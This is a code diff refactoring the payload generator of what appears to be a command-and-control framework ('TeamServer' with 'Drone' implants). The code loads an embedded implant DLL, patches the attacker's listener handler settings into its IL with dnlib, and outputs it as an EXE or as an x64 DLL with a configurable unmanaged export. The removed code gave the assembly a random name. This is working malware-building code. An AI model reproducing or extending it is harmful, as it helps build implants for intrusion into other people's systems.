@@ -1,4 +1,4 @@
-﻿using System;
+using System;
 using System.IO;
 using System.Linq;
 using System.Threading.Tasks;
@@ -9,56 +9,61 @@ using dnlib.DotNet.Writer;
 using dnlib.PE;
 
 using TeamServer.Handlers;
-using TeamServer.Interfaces;
 
-namespace TeamServer.Services
+namespace TeamServer.Models
 {
-    public class PayloadService
+    public class Payload
     {
-        private Handler _handler;
+        public PayloadFormat Format { get; set; }
+        public string DllExport { get; set; }
+        public byte[] Content { get; set; }
         
-        public async Task<byte[]> GeneratePayload(Handler handler, string format)
+        private Handler _handler;
+
+        public enum PayloadFormat
         {
-            _handler = handler;
-            
-            var droneDll = await Utilities.GetEmbeddedResource("drone.dll");
-            
-            var moduleDef = EmbedHandler(droneDll);
-            moduleDef = RandomiseName(moduleDef);
+            Exe,
+            Dll
+        }
+
+        public void SetHandler(Handler handler)
+            => _handler = handler;
+
+        public async Task Generate()
+        {
+            var drone = await Utilities.GetEmbeddedResource("drone.dll");
+            var module = ModuleDefMD.Load(drone);
+            module = EmbedHandler(module);
             
             var ms = new MemoryStream();
-
-            if (format.Equals("exe", StringComparison.OrdinalIgnoreCase))
+            
+            if (Format == PayloadFormat.Exe)
             {
-                moduleDef = ConvertDllToExe(moduleDef);
-                moduleDef.Write(ms);
+                module = ConvertDllToExe(module);
+                module.Write(ms);
             }
-
-            if (format.Equals("dll", StringComparison.OrdinalIgnoreCase))
+            
+            if (Format == PayloadFormat.Dll)
             {
-                moduleDef = AddUnmanagedExport(moduleDef);
+                module = AddUnmanagedExport(module);
 
-                var opts = new ModuleWriterOptions(moduleDef)
+                var opts = new ModuleWriterOptions(module)
                 {
                     PEHeadersOptions = {Machine = Machine.AMD64},
                     Cor20HeaderOptions = {Flags = 0}
                 };
                 
-                moduleDef.Write(ms, opts);
+                module.Write(ms, opts);
             }
-
-            var payload = ms.ToArray();
+            
+            Content = ms.ToArray();
             await ms.DisposeAsync();
-            return payload;
         }
 
-        private ModuleDefMD EmbedHandler(byte[] drone)
+        private ModuleDefMD EmbedHandler(ModuleDefMD module)
         {
-            var moduleDef = ModuleDefMD.Load(drone);
-            var handlerParameters = _handler.Parameters;
-            
             // get handlers (not including the abstract)
-            var handlers = moduleDef.Types
+            var handlers = module.Types
                 .Where(t => t.FullName.Contains("Drone.Handlers", StringComparison.OrdinalIgnoreCase))
                 .Where(t => !t.FullName.Equals("Drone.Handlers.Handler", StringComparison.OrdinalIgnoreCase));
             
@@ -86,9 +91,9 @@ namespace TeamServer.Services
 
             if (targetHandler is null) throw new Exception("Could not find matching Handler");
 
-            if (handlerParameters is not null)
+            if (_handler.Parameters is not null)
             {
-                foreach (var handlerParameter in handlerParameters)
+                foreach (var handlerParameter in _handler.Parameters)
                 {
                     // get matching method in handler
                     var method = targetHandler.Methods.GetMethod(handlerParameter.Name);
@@ -99,49 +104,38 @@ namespace TeamServer.Services
             }
 
             // finally, ensure that the drone is creating an instance of the correct handler
-            var droneType = moduleDef.Types.GetType("Drone");
+            var droneType = module.Types.GetType("Drone");
             var getHandler = droneType.Methods.GetMethod("get_GetHandler");
             getHandler.Body.Instructions[0].Operand = targetHandler.Methods.GetConstructor();
 
-            return moduleDef;
+            return module;
         }
 
-        private static ModuleDefMD ConvertDllToExe(ModuleDefMD mod)
+        private static ModuleDefMD ConvertDllToExe(ModuleDefMD module)
         {
-            mod.Kind = ModuleKind.Console;
+            module.Kind = ModuleKind.Console;
 
-            var program = mod.Types.GetType("Program");
+            var program = module.Types.GetType("Program");
             var main = program?.Methods.GetMethod("Main");
 
-            mod.EntryPoint = main;
+            module.EntryPoint = main;
 
-            return mod;
+            return module;
         }
-
-        private static ModuleDefMD AddUnmanagedExport(ModuleDefMD mod)
+        
+        private ModuleDefMD AddUnmanagedExport(ModuleDefMD mod)
         {
             var program = mod.Types.GetType("Program");
             var execute = program?.Methods.GetMethod("Execute");
             if (execute is null) return mod;
             
-            execute.ExportInfo = new MethodExportInfo();
+            execute.ExportInfo = new MethodExportInfo(DllExport);
             execute.IsUnmanagedExport = true;
             
             var type = execute.MethodSig.RetType;
             type = new CModOptSig(mod.CorLibTypes.GetTypeRef("System.Runtime.CompilerServices", "CallConvStdcall"), type);
             execute.MethodSig.RetType = type;
 
-            return mod;
-        }
-
-        private static ModuleDefMD RandomiseName(ModuleDefMD mod)
-        {
-            var name = Path.GetRandomFileName();
-            
-            mod.Name = name;
-            mod.Assembly.Name= name;
-            mod.Assembly.Version = new Version(1, 3, 3, 7);
-            
             return mod;
         }
     }
